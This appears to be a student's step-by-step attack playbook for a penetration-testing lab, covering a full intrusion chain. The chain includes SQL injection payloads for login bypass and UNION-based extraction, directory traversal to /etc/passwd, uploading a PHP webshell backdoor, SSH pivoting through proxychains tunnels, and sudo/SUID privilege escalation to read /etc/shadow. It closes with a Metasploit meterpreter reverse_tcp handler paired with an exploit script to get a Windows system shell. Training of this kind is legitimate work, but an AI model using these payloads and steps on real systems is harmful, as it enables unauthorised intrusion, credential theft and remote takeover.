LIN OPS-----------------------------------------------------------------------------------------------
Nmap the given network to see what ports you are able to access

If 80 is open nmap <IP> -Pn -T5 --script=banner ,http-enum.nse

Note the Host names next to the Ip in the OP notes under that put the results of the scans
Website------------------------------------------------------------------------------------------------
Navigate to the website open all things that you can click on (enumerate the website)

If there is no /uploads folder then ignore trying to upload the malicous file. there is a .php file (this file is in the FG its meant to open a backdoor on the system)

Make sure to write down the credentials you find in the OP notes

When you see the user name and password boxes its a post method (bob' or 1'=1)

then open the inspection tab and go to network so you can capture the request, put the question mark behined the .php and put the raw request next to it on the lin ops its names webshell.php

If it doesn't give you a proper format then inspect the page, this should show you the data, if credentials are hidden behined this make sure you decode them either ROT13 or base64 

If you see FILE TO READ with a text box directory traversal, so you could do something like ../../../../../../../../../etc/hosts or ../../../../../../../etc/passwd

Write down the collected information into the op notes 
SSH------------------------------------------------------------
Then using any credentials you gained ssh into the box to enumerate 

Run a Ping sweep to find other targets to go to 

Write the results of the ping sweep in the OP notes
LIN OPS--------------------------
open a MS and a dynaic port to use proxychains nmap to enumerate the machines you find

write the results of the nmap scan into the OP notes

Tunnel to all the ports you find open

WEB APP -----------------------------------------------------------------------------------
When you see buttons or an url that ends with php?word=<value> 

you then change the value and add OR 1=1; tothe end EX. ?product=1 OR 1=1;

the use union select 1,2,3; to find the number of collumns this can be extended if you belive there are more columns

verify the order that it nees to be placed in sometimes 1,2,3 can be 1,3,2 so you would have to move around your golden statment in order to make sure that works

************golden statment (union select table_schema,table_name,column_name from information_schema.columns) so if the order was swapped it would be (union select table_schema,column_name,table_name from information_schema.columns)

ignore information_schema, mysql, and performacnce_schema at the bottom will be the user made ones

if the table reads |siteusers|users|username| the sql injection will look like UNION SELECT username,2,3 from siteusers.users 

write down any information you find in the OP notes

Make a tunnel to the WEB APP so you are able to have access to your tools 

SSH-------------------------------------------------------------------
ping sweep 

Write your findings in your OP Notes 

Priviledge escilation sudo -l

go to gtfobins find which ever the user can run to break out into a root shell 

copy the command to escalate privledges 

if thats not avaliable search for the SUID and GUIDS

enumerate the root files and all other files root can only see like /etc/shadow or the /root directory

Pivot to the other targets that you found during the earlier ping sweep

LIN OPS ------------------------------------------------------------------------------

Set up a dynaic tunnel to the machine that has access to the windows machine

find the open ports

bannergrab them with the nmap script frrom earlier

find the secure server port for 

set a tunnel to it possibly 9999 

in the windowsdeb.py on lin ops, change the port to whatever port you set on your tunnel to the secure server

(1) on your linops open a listening port
(2) msfconsole
(3) use exploit/multi/handler
(4) set payload windows/meterpreter/reverse_tcp
(5) set LHOST 0.0.0.0
(6) set LPORT 10000 (or whatever port was used to generate the shell code
(7) exploit
(8) python ./windowsdeb.py

this should open a system shell on the lin ops


if one is the 3389 set a tunnel up to it so you can RDP to it

xfreerdp /u:<username> /p:<password> /v:<loopback> /port:<the port set up on the tunnel to the RDP> /dynamic-resolution +glyth-cache +clipboard
